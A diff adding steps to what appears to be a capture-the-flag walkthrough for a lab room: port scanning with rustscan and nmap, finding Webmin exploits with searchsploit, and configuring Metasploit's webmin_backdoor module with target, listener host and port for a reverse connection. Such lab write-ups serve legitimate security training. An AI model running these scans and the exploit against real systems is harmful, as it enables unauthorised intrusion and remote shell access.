@@ -40,3 +40,33 @@
 
 ### • 5. Now let's set the room ip in ***/etc/hosts*** so we don't have to type ip everytime. 
     sudo nano /etc/hosts
+
+### • 6. Scan for the open ports in the ip by rustscan and save it as rustscan-sv-sc-source.txt
+     sudo rustscan -a source.com -- --script vuln -oN rustscan-sv-sc-source.txt
+
+as we can see it dont give us full details On the Open Ports so we will again use Nmap to scan the open ports we got from the rustscan.
+
+### • 7. Now we will use the Nmap to scan all the known open ports.
+    sudo nmap -p(port no.) -sV source.com
+
+### • 8. As we obtainesd ports details from the upper scan now we will search for the spoloits feom search ***searchsploits*** Command so we got that its is a webmin fro mm yupper scan so we will do:
+    seachsploit webmin
+
+
+### • 9. And as it contains "Metasploit" as one of the sploits available so we will use ***msfconsole***.
+    msfconsole
+
+### • 10. And now we will search for the sploits for webmin in msfconsole.
+    search webmin
+
+### • 11. We hav eto select ***exploit/linux/http/webmin_backdoor*** whichever number it is in.
+
+### • 12. Now we gotta see what informations are required to be filed to usee this sploit for tht we wioll use:
+    show options 
+
+### • 13. Now fill all the reuired infos
+    set RHOSTS >the ip that was given by the room<
+
+    set LHOST >the ip of ur vpn/tun0<
+
+    set LPORT >the port u wanna use for this operation(tht port should be free/not alredy in use)<
